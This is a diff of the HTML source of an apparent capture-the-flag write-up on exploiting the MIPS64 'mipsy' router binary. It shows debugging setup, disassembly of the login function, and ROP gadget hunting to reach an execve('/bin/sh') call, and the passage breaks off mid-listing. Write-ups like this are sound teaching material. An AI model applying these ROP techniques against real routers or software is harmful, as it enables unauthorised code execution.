-<span class="o">(</span>No debugging symbols found in ./mipsy<span class="o">)</span>
-pwndbg: loaded <span class="m">196</span> commands. Type pwndbg <span class="o">[</span>filter<span class="o">]</span> <span class="k">for</span> a list.
-pwndbg: created <span class="nv">$rebase</span>, <span class="nv">$ida</span> gdb functions <span class="o">(</span>can be used with print/break<span class="o">)</span>
+(No debugging symbols found in ./mipsy)
+pwndbg: loaded 196 commands. Type pwndbg [filter] for a list.
+pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
 pwndbg&gt; target remote localhost:5445
 
-</code></pre></div><p>To send the payload  I used <a
+</code></pre><p>To send the payload  I used <a
   class="gblog-markdown__link"
   href="https://github.com/Gallopsled/pwntools"
   
@@ -964,42 +1004,42 @@ pwndbg&gt; target remote localhost:5445
 <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
 <span class="nb">print</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;] &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
 </code></pre></div><p>Now we launch the python script to trigger the socat:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ python3 wu.py                                                               
-<span class="o">[</span>+<span class="o">]</span> Opening connection to localhost on port 4000: Done
-</code></pre></div><p>It does not return anything because it breaks in the shared libraries I guess, so now we can continue the execution in gdb:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">Remote debugging using localhost:5445
-warning: Unable to find dynamic linker breakpoint <span class="k">function</span>.
+<pre tabindex="0"><code>$ python3 wu.py                                                               
+[+] Opening connection to localhost on port 4000: Done
+</code></pre><p>It does not return anything because it breaks in the shared libraries I guess, so now we can continue the execution in gdb:</p>
+<pre tabindex="0"><code>Remote debugging using localhost:5445
+warning: Unable to find dynamic linker breakpoint function.
 GDB will be unable to debug shared library initializers
 and track explicitly loaded dynamic code.
-0x00000040008038d0 in ?? <span class="o">()</span>
-Could not check ASLR: Couldn<span class="s1">&#39;t get personality
-</span><span class="s1">Downloading &#39;</span>/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy<span class="s1">&#39; from the remote server: OK
-</span><span class="s1">add-symbol-file /tmp/tmpsjb8mqsa/mipsy 0x120000000 -s .MIPS.abiflags 0x2400002e0 -s .MIPS.options 0x2400002f8 -s .note.gnu.build-id 0x240000870 -s .dynamic 0x240000898 -s .hash 0x240000aa8 -s .dynsym 0x240001190 -s .dynstr 0x240002858 -s .gnu.version 0x240003b12 -s .gnu.version_r 0x240003cf8 -s .rel.dyn 0x240003d38 -s .init 0x240003d58 -s .text 0x240003de0 -s .MIPS.stubs 0x2400257a0 -s .fini 0x2400259c0 -s .rodata 0x240025a10 -s .interp 0x24002d280 -s .eh_frame_hdr 0x24002d290 -s .eh_frame 0x24002d2a8 -s .note.ABI-tag 0x24002d2e0 -s .ctors 0x24003df58 -s .dtors 0x24003df68 -s .data.rel.ro 0x24003df78 -s .data 0x240040000 -s .rld_map 0x240040020 -s .got 0x240040030 -s .sdata 0x240040840 -s .bss 0x240040850
-</span><span class="s1">&#39;</span>context<span class="s1">&#39;: Print out the current register, instruction, and stack context.
-</span><span class="s1">Exception occurred: context: unsupported operand type(s) for +: &#39;</span>NoneType<span class="s1">&#39; and &#39;</span>int<span class="s1">&#39; (&lt;class &#39;</span>TypeError<span class="err">&#39;</span>&gt;<span class="o">)</span>
-For more info invoke <span class="sb">`</span><span class="nb">set</span> exception-verbose on<span class="sb">`</span> and rerun the <span class="nb">command</span>
-or debug it by yourself with <span class="sb">`</span><span class="nb">set</span> exception-debugger on<span class="sb">`</span>
+0x00000040008038d0 in ?? ()
+Could not check ASLR: Couldn't get personality
+Downloading '/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy' from the remote server: OK
+add-symbol-file /tmp/tmpsjb8mqsa/mipsy 0x120000000 -s .MIPS.abiflags 0x2400002e0 -s .MIPS.options 0x2400002f8 -s .note.gnu.build-id 0x240000870 -s .dynamic 0x240000898 -s .hash 0x240000aa8 -s .dynsym 0x240001190 -s .dynstr 0x240002858 -s .gnu.version 0x240003b12 -s .gnu.version_r 0x240003cf8 -s .rel.dyn 0x240003d38 -s .init 0x240003d58 -s .text 0x240003de0 -s .MIPS.stubs 0x2400257a0 -s .fini 0x2400259c0 -s .rodata 0x240025a10 -s .interp 0x24002d280 -s .eh_frame_hdr 0x24002d290 -s .eh_frame 0x24002d2a8 -s .note.ABI-tag 0x24002d2e0 -s .ctors 0x24003df58 -s .dtors 0x24003df68 -s .data.rel.ro 0x24003df78 -s .data 0x240040000 -s .rld_map 0x240040020 -s .got 0x240040030 -s .sdata 0x240040840 -s .bss 0x240040850
+'context': Print out the current register, instruction, and stack context.
+Exception occurred: context: unsupported operand type(s) for +: 'NoneType' and 'int' (&lt;class 'TypeError'&gt;)
+For more info invoke `set exception-verbose on` and rerun the command
+or debug it by yourself with `set exception-debugger on`
 pwndbg&gt; vmmap
-LEGEND: STACK <span class="p">|</span> HEAP <span class="p">|</span> CODE <span class="p">|</span> DATA <span class="p">|</span> RWX <span class="p">|</span> RODATA
-       0x120000000        0x12002e000 r-xp    2e000 <span class="m">0</span>      /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+       0x120000000        0x12002e000 r-xp    2e000 0      /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
        0x12002e000        0x12003d000 ---p     f000 2d000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
-       0x12003d000        0x120040000 r--p     <span class="m">3000</span> 2d000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
-       0x120040000        0x120043000 rw-p     <span class="m">3000</span> <span class="m">30000</span>  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
-      0x4000403000       0x4000828000 r--p   <span class="m">425000</span> <span class="m">0</span>      &lt;explored&gt;
-      0x40007fe000       0x4000801000 rw-p     <span class="m">3000</span> <span class="m">0</span>      <span class="o">[</span>stack<span class="o">]</span>
+       0x12003d000        0x120040000 r--p     3000 2d000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
+       0x120040000        0x120043000 rw-p     3000 30000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
+      0x4000403000       0x4000828000 r--p   425000 0      &lt;explored&gt;
+      0x40007fe000       0x4000801000 rw-p     3000 0      [stack]
 
-<span class="o">[</span>QEMU target detected - vmmap result might not be accurate<span class="p">;</span> see <span class="sb">`</span><span class="nb">help</span> vmmap<span class="sb">`</span><span class="o">]</span>
-pwndbg&gt; <span class="k">continue</span>
+[QEMU target detected - vmmap result might not be accurate; see `help vmmap`]
+pwndbg&gt; continue
 Continuing.
-warning: Could not load shared library symbols <span class="k">for</span> <span class="m">2</span> libraries, e.g. /lib/libc.so.6.
-Use the <span class="s2">&#34;info sharedlibrary&#34;</span> <span class="nb">command</span> to see the <span class="nb">complete</span> listing.
-Do you need <span class="s2">&#34;set solib-search-path&#34;</span> or <span class="s2">&#34;set sysroot&#34;</span>?
-<span class="o">[</span>Inferior <span class="m">1</span> <span class="o">(</span>process 1<span class="o">)</span> exited normally<span class="o">]</span>
-</code></pre></div><p>The process exited because we didn&rsquo;t inserted any breakpoints and so our python script outs this:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">+---------------------------------+
-<span class="p">|</span>/                               <span class="se">\|</span>
-<span class="p">|</span>        ITSY MIPSY ROUTER        <span class="p">|</span>
-<span class="p">|</span><span class="se">\ </span>                              /<span class="p">|</span>
+warning: Could not load shared library symbols for 2 libraries, e.g. /lib/libc.so.6.
+Use the &quot;info sharedlibrary&quot; command to see the complete listing.
+Do you need &quot;set solib-search-path&quot; or &quot;set sysroot&quot;?
+[Inferior 1 (process 1) exited normally]
+</code></pre><p>The process exited because we didn&rsquo;t inserted any breakpoints and so our python script outs this:</p>
+<pre tabindex="0"><code>+---------------------------------+
+|/                               \|
+|        ITSY MIPSY ROUTER        |
+|\                               /|
 +---------------------------------+
 
 Menu:
@@ -1008,8 +1048,8 @@ Menu:
   2. Ping internal HTTP file server
   3. Log in as admin
 
-<span class="o">[</span>guest@mipsy<span class="o">]</span> 
-</code></pre></div><p>We&rsquo;re able to debug properly our process !</p>
+[guest@mipsy] 
+</code></pre><p>We&rsquo;re able to debug properly our process !</p>
 <div class="gblog-post__anchorwrap">
     <h2 id="reverse-engineering">
         Reverse Engineering
@@ -1019,13 +1059,13 @@ Menu:
     </h2>
 </div>
 <p>We can take a look at the binary by running the file command:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ file mipsy                                                                  
-mipsy: ELF 64-bit MSB executable, MIPS, MIPS64 rel2 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld.so.1, BuildID<span class="o">[</span>sha1<span class="o">]=</span>e20cf7872e96482095ce68e6d4d03806d5928de4, <span class="k">for</span> GNU/Linux 3.2.0, not stripped
-</code></pre></div><p>So it&rsquo;s a mips64 big endian binary dynamically linked. As we see above, the program is asking for an input among 4 options: Quit, Show network interfaces, Ping internal HTTP file server and Login as admin. We can test these options remotely:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">+---------------------------------+
-<span class="p">|</span>/                               <span class="se">\|</span>
-<span class="p">|</span>        ITSY MIPSY ROUTER        <span class="p">|</span>
-<span class="p">|</span><span class="se">\ </span>                              /<span class="p">|</span>
+<pre tabindex="0"><code>$ file mipsy                                                                  
+mipsy: ELF 64-bit MSB executable, MIPS, MIPS64 rel2 version 1 (SYSV), dynamically linked, interpreter /lib64/ld.so.1, BuildID[sha1]=e20cf7872e96482095ce68e6d4d03806d5928de4, for GNU/Linux 3.2.0, not stripped
+</code></pre><p>So it&rsquo;s a mips64 big endian binary dynamically linked. As we see above, the program is asking for an input among 4 options: Quit, Show network interfaces, Ping internal HTTP file server and Login as admin. We can test these options remotely:</p>
+<pre tabindex="0"><code>+---------------------------------+
+|/                               \|
+|        ITSY MIPSY ROUTER        |
+|\                               /|
 +---------------------------------+
 
 Menu:
@@ -1034,7 +1074,7 @@ Menu:
   2. Ping internal HTTP file server
   3. Log in as admin
 
-<span class="o">[</span>guest@mipsy<span class="o">]</span> $ <span class="m">1</span>
+[guest@mipsy] $ 1
 The router has the following network interfaces:
 * lo
 * eth0
@@ -1047,7 +1087,7 @@ Menu:
   2. Ping internal HTTP file server
   3. Log in as admin
 
-<span class="o">[</span>guest@mipsy<span class="o">]</span> $ <span class="m">2</span>
+[guest@mipsy] $ 2
 Success: HTTP file server is up!
 
 Menu:
@@ -1056,7 +1096,7 @@ Menu:
   2. Ping internal HTTP file server
   3. Log in as admin
 
-<span class="o">[</span>guest@mipsy<span class="o">]</span> $ <span class="m">3</span>
+[guest@mipsy] $ 3
 Input your password:
 &gt;&gt;&gt; l3eT_p4sS
 Error: wrong password.
@@ -1067,84 +1107,9 @@ Menu:
   2. Ping internal HTTP file server
   3. Log in as admin
 
-<span class="o">[</span>guest@mipsy<span class="o">]</span> $ <span class="m">0</span>
-</code></pre></div><p>It doesn&rsquo;t give any interesting informations so instead of fuzzing manually the binary to find the vulnerability, I reversed the main functions in IDA. And particulary the code of the the function corresponding to the &ldquo;Login as admin&rdquo; feature. The assembly code of this function looks like such:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="na">.globl</span> <span class="no">authenticate</span>
+[guest@mipsy] $ 0
+</code></pre><p>It doesn&rsquo;t give any interesting informations so instead of fuzzing manually the binary to find the vulnerability, I reversed the main functions in IDA. And particulary the code of the the function corresponding to the &ldquo;Login as admin&rdquo; feature. The assembly code of this function looks like such:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="na">.globl</span> <span class="no">authenticate</span>
 <span class="nl">authenticate:</span>
 
 <span class="nf">var_40</span><span class="err">=</span> <span class="p">-</span><span class="mi">0x40</span>
@@ -1214,10 +1179,8 @@ Menu:
 </span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
 <span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; memcmp     ; Jump And Link Register
 </span><span class="c"></span><span class="no">nop</span>
-<span class="nf">bnez</span>    <span class="no">$v0</span><span class="p">,</span> <span class="no">loc_120004688</span>  <span class="err">;</span> <span class="no">Branch</span> <span class="no">on</span> <span class="no">Not</span> <span class="no">Zero</span></code></pre></td></tr></table>
-</div>
-</div>
-<p>When I began this challenge I didn&rsquo;t know anything about mips64 assembly but thanks to auto comments in IDA and to <a
+<span class="nf">bnez</span>    <span class="no">$v0</span><span class="p">,</span> <span class="no">loc_120004688</span>  <span class="c">; Branch on Not Zero
+</span></code></pre></div><p>When I began this challenge I didn&rsquo;t know anything about mips64 assembly but thanks to auto comments in IDA and to <a
   class="gblog-markdown__link"
   href="http://math-atlas.sourceforge.net/devel/assembly/mips-iv.pdf"
   
@@ -1273,102 +1236,9 @@ But since we&rsquo;re able to jmp everywhere, we have to figure out what kind of
         </a>
     </h4>
 </div>
-<p>For an obsure reason, I thought the <code>gets</code> function had for badchar the NULL byte, so I was looking for a one gadget in the binary.</p>
-<p>I discovered during the reverse engineering part an interesting snippet of code:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span><span class="lnt">73
-</span><span class="lnt">74
-</span><span class="lnt">75
-</span><span class="lnt">76
-</span><span class="lnt">77
-</span><span class="lnt">78
-</span><span class="lnt">79
-</span><span class="lnt">80
-</span><span class="lnt">81
-</span><span class="lnt">82
-</span><span class="lnt">83
-</span><span class="lnt">84
-</span><span class="lnt">85
-</span><span class="lnt">86
-</span><span class="lnt">87
-</span><span class="lnt">88
-</span><span class="lnt">89
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span>                 <span class="no">.globl</span> <span class="no">ip</span>
+<p>For an obsure reason, I thought the <code>gets</code> function had for badchar the NULL byte, so I was looking for a one gadget in the binary.
+I discovered during the reverse engineering part an interesting snippet of code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span>                 <span class="no">.globl</span> <span class="no">ip</span>
 <span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">ip</span><span class="p">:</span>                                      <span class="c">; CODE XREF: main+260↓p
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FC0</span>                                          <span class="c">; DATA XREF: LOAD:0000000120002438↑o ...
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FC0</span>
@@ -1456,10 +1326,7 @@ But since we&rsquo;re able to jmp everywhere, we have to figure out what kind of
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004148</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; execve     ; Jump And Link Register
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000414</span><span class="no">C</span>                 <span class="no">nop</span>
 <span class="c">; skip
-</span><span class="c"></span><span class="err">```</span></code></pre></td></tr></table>
-</div>
-</div>
-<p>It&rsquo;s a part of the <code>ip</code> function, called when we trigger the &ldquo;Show network interfaces&rdquo; option. When I saw at the begin of the function, some local variables like a pointer to the <code>&quot;/bin/sh&quot;</code> string and a block of code which executes especially <code>execve(&quot;/bin/sh&quot;, &quot;-c&quot;, NULL)</code>. Since I discovered this basic block I thought I should have to jump around it with the right stackframe. But after a few hours I figured out it wasn&rsquo;t possible :(. And figured out too that the <code>NULL</code> byte isn&rsquo;t a badchar :).</p>
+</span></code></pre></div><p>It&rsquo;s a part of the <code>ip</code> function, called when we trigger the &ldquo;Show network interfaces&rdquo; option. When I saw at the begin of the function, some local variables like a pointer to the <code>&quot;/bin/sh&quot;</code> string and a block of code which executes especially <code>execve(&quot;/bin/sh&quot;, &quot;-c&quot;, NULL)</code>. Since I discovered this basic block I thought I should have to jump around it with the right stackframe. But after a few hours I figured out it wasn&rsquo;t possible :(. And figured out too that the <code>NULL</code> byte isn&rsquo;t a badchar :).</p>
 <div class="gblog-post__anchorwrap">
     <h4 id="ropchain">
         ROPchain
@@ -1474,34 +1341,21 @@ But since we&rsquo;re able to jmp everywhere, we have to figure out what kind of
   
   >ROPgadget</a
 > to find some suitable gadgets:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ROPgadget --binary mipsy &gt; gadgets
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ ROPgadget --binary mipsy &gt; gadgets
 </code></pre></div><p>On mips architechture there is no <code>ret</code> or <code>pop</code> instructions, to handle this issue we use gadgets which load directly a 64 bit value stored in the stack into a register like this:</p>
 <pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">ld $a0, 0x8($sp) ; It will read the doubleword in $sp+8 to load it in the $a0 register.
 </code></pre><p>And to return we need to find a load on a register like <code>$t9</code> which is often used to resolve and call extern functions or on <code>$ra</code> which is the standard register used to store the address of the calling function.</p>
 <p>And that&rsquo;s why it&rsquo;s too hard to find automatically gadgets for mips binaries. But fortunately, ROPgadgets finds a a great amount of gadgets which helps us a lot.</p>
 <p>The exploitation would be for me to jmp to the execve&rsquo;s call with the right context.
 The code looks like such:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">0000000120004134</span>                 <span class="nf">move</span>    <span class="no">$a2</span><span class="p">,</span> <span class="no">$zero</span>       <span class="c">; envp
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">0000000120004134</span>                 <span class="nf">move</span>    <span class="no">$a2</span><span class="p">,</span> <span class="no">$zero</span>       <span class="c">; envp
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004138</span>                 <span class="no">move</span>    <span class="no">$a1</span><span class="p">,</span> <span class="no">$v1</span>         <span class="c">; argv
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000413</span><span class="no">C</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; path
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004140</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">execve</span>      <span class="c">; Load 64-bit address
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004144</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; execve
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004148</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; execve     ; Jump And Link Register
-</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000414</span><span class="no">C</span>                 <span class="no">nop</span></code></pre></td></tr></table>
-</div>
-</div>
-<p>To do so we have to:</p>
+</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000414</span><span class="no">C</span>                 <span class="no">nop</span>
+</code></pre></div><p>To do so we have to:</p>
 <ul>
 <li>set <code>$v1</code> register to <code>NULL</code></li>
 <li>set <code>$v0</code> register to a pointer to <code>/bin/sh</code></li>
@@ -1517,38 +1371,24 @@ The code looks like such:</p>
 <p>To control the <code>$v1</code> register we can grep on the gadgets found by ROPgadget:</p>
 <pre tabindex="0"><code>$ grep &quot;ld \$v0, &quot; gadgets | grep \$sp
 </code></pre><p>Then we got a lot of candidate which are not efficient. And if we&rsquo;re very careful we find an interesting gadget:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">0x000000012001b4d8 : ld <span class="nv">$v0</span>, 0x210<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> ld <span class="nv">$t9</span>, 0x228<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> jalr <span class="nv">$t9</span> <span class="p">;</span> move <span class="nv">$a0</span>, <span class="nv">$s6</span>
-</code></pre></div><p>It&rsquo;s perfect because it allows us to control the value of <code>$v0</code> and the value of the next gadget that we can store in <code>$t9</code> to jump on !</p>
+<pre tabindex="0"><code>0x000000012001b4d8 : ld $v0, 0x210($sp) ; ld $t9, 0x228($sp) ; jalr $t9 ; move $a0, $s6
+</code></pre><p>It&rsquo;s perfect because it allows us to control the value of <code>$v0</code> and the value of the next gadget that we can store in <code>$t9</code> to jump on !</p>
 <p>We can apply process to find a gadget for $v1:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ grep <span class="s2">&#34;ld \$v1, &#34;</span> gadgets <span class="p">|</span> grep <span class="se">\$</span>sp
-<span class="o">[</span>skip<span class="o">]</span>
-0x000000012001270c : ld <span class="nv">$v1</span>, 0x80<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> sd <span class="nv">$v0</span>, 0xf0<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> dsubu <span class="nv">$s5</span>, <span class="nv">$v0</span>, <span class="nv">$v1</span> <span class="p">;</span> dsll <span class="nv">$v0</span>, <span class="nv">$s5</span>, <span class="m">6</span> <span class="p">;</span> ld <span class="nv">$a0</span>, 0xb8<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> ld <span class="nv">$t9</span>, 0xe0<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> move <span class="nv">$a1</span>, <span class="nv">$v0</span> <span class="p">;</span> sd <span class="nv">$v1</span>, 0xf8<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> jalr <span class="nv">$t9</span> <span class="p">;</span> sd <span class="nv">$v0</span>, 0x100<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span>
-<span class="o">[</span>skip<span class="o">]</span>
-</code></pre></div><p>It&rsquo;s a gadget a bit more hard to understand but we just have to take care to: do not write <code>$v0</code>, control the value of <code>$v9</code> to jump on, control the value of <code>$v1</code>. And so this gadget is a good candidate.</p>
+<pre tabindex="0"><code>$ grep &quot;ld \$v1, &quot; gadgets | grep \$sp
+[skip]
+0x000000012001270c : ld $v1, 0x80($sp) ; sd $v0, 0xf0($sp) ; dsubu $s5, $v0, $v1 ; dsll $v0, $s5, 6 ; ld $a0, 0xb8($sp) ; ld $t9, 0xe0($sp) ; move $a1, $v0 ; sd $v1, 0xf8($sp) ; jalr $t9 ; sd $v0, 0x100($sp)
+[skip]
+</code></pre><p>It&rsquo;s a gadget a bit more hard to understand but we just have to take care to: do not write <code>$v0</code>, control the value of <code>$v9</code> to jump on, control the value of <code>$v1</code>. And so this gadget is a good candidate.</p>
 <p>Finally we need to control the value of the <code>$gp</code> register but to achieve that we do not need to use a gadget, because we already control it thanks to the vuln epilogue:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">00000001200046</span><span class="nf">A4</span> <span class="no">loc_1200046A4</span><span class="p">:</span>                           <span class="c"># CODE XREF: authenticate+104↑j
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">00000001200046</span><span class="nf">A4</span> <span class="no">loc_1200046A4</span><span class="p">:</span>                           <span class="c"># CODE XREF: authenticate+104↑j
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">A4</span>                 <span class="no">move</span>    <span class="no">$sp</span><span class="p">,</span> <span class="no">$fp</span>         <span class="c"># _
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">A8</span>                 <span class="no">ld</span>      <span class="no">$ra</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">ret_addr</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c"># Load Doubleword
